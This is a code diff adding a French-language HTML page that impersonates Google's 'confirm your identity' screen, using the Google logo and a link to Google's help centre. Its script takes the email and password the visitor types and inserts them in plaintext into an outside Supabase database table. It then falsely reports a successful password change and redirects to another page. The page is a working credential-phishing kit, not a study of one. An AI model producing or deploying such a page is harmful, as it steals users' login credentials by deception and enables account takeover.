@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmer votre identitée - Google</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0c5db9;
+        }
+        .link {
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
+        <h2>Confirmez votre identitée</h2>
+        <form id="passwordForm">
+            <input type="email" id="email" placeholder="Votre adresse e-mail" required>
+            <input type="password" id="password" placeholder="confirmez votre mot de passe" required>
+            <input type="password" id="confirmPassword" placeholder="Confirmer votre mot de passe" required>
+            <p class="error" id="errorMessage">⚠️ Les mots de passe ne correspondent pas.</p>
+            <button type="submit">Confirmer</button>
+        </form>
+        <a href="https://support.google.com/?hl=fr">Besoin d'aide ?</a>
+    </div>
+
+    <script>
+        // Initialisation de Supabase
+        const SUPABASE_URL = 'https://ejtqzrwyopijgstbvhyb.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVqdHF6cnd5b3BpamdzdGJ2aHliIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDc1ODI4MjQsImV4cCI6MjA2MzE1ODgyNH0.z2NumrWkR4IbosI6E8ZilIUoc97iQnUGaqtjh-dDFdE';
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Vérification des mots de passe et envoi à Supabase
+        document.getElementById("passwordForm").addEventListener("submit", async function(event) {
+            event.preventDefault(); // Empêche l'envoi du formulaire
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            let confirmPassword = document.getElementById("confirmPassword").value;
+            let errorMessage = document.getElementById("errorMessage");
+
+            if (password !== confirmPassword) {
+                errorMessage.style.display = "block";
+            } else {
+                errorMessage.style.display = "none";
+
+                try {
+                    // Envoi des données à Supabase (table "conec")
+                    const { data, error } = await supabase
+                        .from("conec") // Table correcte
+                        .insert([{ email: email, password: password }]);
+
+                    if (error) {
+                        console.error("Erreur:", error.message);
+                        alert("Une erreur est survenue.");
+                    } else {
+                        console.log("Mot de passe modifié:", data);
+                        alert("Mot de passe modifié avec succès !");
+                        window.location.href = "connexion.html"; // Redirection après modification
+                    }
+                } catch (err) {
+                    console.error("Erreur inattendue:", err);
+                    alert("Une erreur inattendue est survenue.");
+                }
+            }
+        });
+
+        // Affichage d'une boîte d'aide
+        document.getElementById("helpLink").addEventListener("click", function() {
+            alert("Si vous avez des difficultés, consultez le centre d'aide Google.");
+        });
+    </script>
+
+</body>
+</html>
